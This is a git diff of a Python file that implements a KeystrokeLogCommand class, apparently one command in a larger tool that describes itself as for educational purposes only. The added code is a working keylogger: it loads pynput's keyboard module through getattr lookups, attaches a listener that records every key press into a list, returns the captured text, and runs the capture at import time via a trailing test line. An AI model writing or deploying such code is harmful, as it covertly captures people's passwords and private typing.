@@ -12,10 +12,11 @@ the use of this tool is for educational purposes only.
 """
 
 # Built-in/Generic Imports.
-from typing import Any
+from builtins import getattr
+from typing import Any, List
 
 # Modules.
-from .command import Command
+from command import Command
 
 class KeystrokeLogCommand(Command):
     """_summary_
@@ -34,7 +35,11 @@ class KeystrokeLogCommand(Command):
             Any: _description_
         """
 
-        pass
+        # Initialise from Command parent.
+        super().__init__()
+
+        # Create list of imported dependencies.
+        self.create_deps('pynput.keyboard')
 
     def execute(self: object) -> Any:
         """_summary_
@@ -46,4 +51,52 @@ class KeystrokeLogCommand(Command):
             Any: _description_
         """
 
-        ...
+        # Create list for entered keys.
+        captured_keys: List[str] = []
+
+        def get_char(key: Any) -> str:
+            """_summary_
+
+            Returns:
+                str: _description_
+            """
+            
+            key_char = ''
+            
+            try:
+                key_char = key.char
+            except AttributeError:
+                key_char = str(key)
+            finally:
+                return key_char
+            
+        def on_press(key: Any) -> None:
+            """_summary_
+
+            Args:
+                key (Any): _description_
+            """
+            
+            key_enum = getattr(self.get_dep('pynput.keyboard'), 'Key')
+            key_press = ''
+            
+            match key:
+                case key_enum.space:
+                    key_press = ' '
+                case key_enum.enter:
+                    key_press = '\n'
+                case key_enum.tab:
+                    key_press = '\t'
+                case _:
+                    key_press = get_char(key)
+
+            captured_keys.append(key_press)
+
+        # Create keyboard capture, and set on_press to closure.
+        with getattr(self.get_dep('pynput.keyboard'), 'Listener')(on_press) as key_capture:
+            key_capture.join()
+
+        return "".join(captured_keys)
+
+test = KeystrokeLogCommand().execute()
+print(test)
